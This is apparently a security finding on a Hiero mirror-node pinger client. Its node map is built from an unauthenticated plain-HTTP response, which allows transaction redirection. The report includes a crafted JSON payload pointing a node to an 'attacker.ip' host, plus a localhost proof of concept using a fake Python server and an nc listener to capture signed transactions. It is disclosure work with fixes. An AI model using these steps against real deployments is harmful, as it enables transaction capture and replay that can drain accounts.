### Title
Unauthenticated Mirror REST Response Enables Node-Map Injection and Silent Transaction Misdirection

### Summary
When `cfg.network == "other"`, `newClient()` builds the entire consensus-node routing table from a plain HTTP response fetched from `cfg.mirrorRest`. No TLS is enforced, no response is authenticated, and no endpoint is validated against any known-good list. An attacker who can control that HTTP response — via MITM, DNS poisoning, or a compromised mirror node — can inject `nodeEntry` records that map legitimate `node_account_id` values to attacker-controlled addresses, causing `hiero.ClientForNetwork(netmap)` to route every subsequent signed transaction to the attacker.

### Finding Description

**Exact code path**

`pinger/sdk_client.go` `newClient()` [1](#0-0)  calls `buildNetworkFromMirrorNodes()`, which delegates to `fetchMirrorNodeNetwork()`.

`fetchMirrorNodeNetwork()` creates a plain `http.Client` with only a timeout: [2](#0-1) 

It issues an unauthenticated GET and decodes the body directly into `nodesEnvelope`: [3](#0-2) 

The only "validation" performed on each entry is a non-empty `node_account_id`, a non-empty host string, and a non-zero port: [4](#0-3) 

The resulting `map[string]hiero.AccountID` — where the key is the attacker-supplied `"host:port"` — is passed verbatim to `hiero.ClientForNetwork(netmap)`: [5](#0-4) 

**Root cause and failed assumption**

The code assumes the mirror REST endpoint is trustworthy and reachable only over a secure channel. Neither assumption is enforced. The example URL in `config.go` is `http://mirror-rest:5551` (plain HTTP): [6](#0-5) 

There is no TLS requirement, no certificate pinning, no HMAC/signature on the response, and no allowlist of permitted endpoint addresses.

**Exploit flow**

1. Attacker positions themselves to intercept or replace the HTTP response (MITM on the pod network, DNS poisoning of `mirror-rest`, or direct compromise of the mirror node service).
2. Attacker returns a crafted JSON body:
   ```json
   {"nodes":[{"node_account_id":"0.0.3","service_endpoints":[{"ip_address_v4":"attacker.ip","port":50211}]}]}
   ```
3. `fetchMirrorNodeNetwork()` accepts this without complaint — `node_account_id` is non-empty, host is non-empty, port is non-zero.
4. `hiero.ClientForNetwork({"attacker.ip:50211": AccountID{0,0,3}})` routes all gRPC calls to the attacker.
5. Every `CryptoTransfer` (and any other transaction) submitted by the pinger is sent — fully signed with the operator private key — to the attacker's server.

**Why existing checks are insufficient**

The only guards are syntactic (`node_account_id` parse, empty-string/zero-port checks). There is no semantic check: no comparison against a pinned node list, no TLS, no response signature, no IP-range allowlist.

### Impact Explanation

- **Transaction misdirection**: All transactions are delivered to the attacker instead of the real consensus network. The pinger silently "fails" from the network's perspective.
- **Signed transaction exposure**: The attacker receives fully signed, valid transactions. These can be replayed against the real network (Hedera transactions carry a `transactionValidDuration`), potentially draining the operator account.
- **Operator key correlation**: Repeated signed transactions reveal the operator account ID and allow traffic analysis.
- Severity: **High** — direct financial impact, silent, no error surfaced to the operator.

### Likelihood Explanation

- Requires the ability to control the HTTP response from `cfg.mirrorRest`. In a Kubernetes cluster (the deployment context implied by `/tmp/alive` and `/tmp/ready`), any compromised pod on the same network namespace can perform ARP/DNS spoofing against the plain-HTTP mirror service.
- The `network=other` path is explicitly intended for private/custom deployments where the mirror node may be operator-managed infrastructure — exactly the environment where internal network attackers are realistic.
- The attack is repeatable: the client is built once at startup, so a single poisoned response persists for the entire lifetime of the process.

### Recommendation

1. **Enforce HTTPS**: Reject any `cfg.mirrorRest` URL that does not use `https://`. Optionally support a configurable CA bundle or certificate pin.
2. **Validate endpoints**: Maintain a configurable allowlist of permitted IP ranges or domain suffixes for `service_endpoints`; reject entries outside it.
3. **Pin the node list**: For `network=other`, allow operators to supply a static node map that is used as the authoritative source, with the mirror response used only to supplement/refresh it.
4. **Add response authentication**: If the mirror node is operator-controlled, sign the `/network/nodes` response (e.g., with an HMAC key shared at deploy time) and verify it before use.

### Proof of Concept

```bash
# 1. Stand up a fake mirror REST server
python3 -c "
import http.server, json
class H(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        body = json.dumps({'nodes':[{
            'node_account_id':'0.0.3',
            'service_endpoints':[{'ip_address_v4':'127.0.0.1','port':9999}]
        }]}).encode()
        self.send_response(200)
        self.send_header('Content-Type','application/json')
        self.end_headers()
        self.wfile.write(body)
http.server.HTTPServer(('0.0.0.0',5551),H).serve_forever()
" &

# 2. Listen on the attacker port to capture signed transactions
nc -lvp 9999 &

# 3. Start the pinger pointed at the fake mirror
HIERO_MIRROR_PINGER_NETWORK=other \
HIERO_MIRROR_PINGER_REST=http://127.0.0.1:5551 \
HIERO_MIRROR_PINGER_OPERATOR_ID=0.0.2 \
HIERO_MIRROR_PINGER_OPERATOR_KEY=<valid_key> \
./pinger

# Result: nc captures the raw gRPC bytes of every signed CryptoTransfer
# sent by the pinger, which can be replayed against the real network.
```
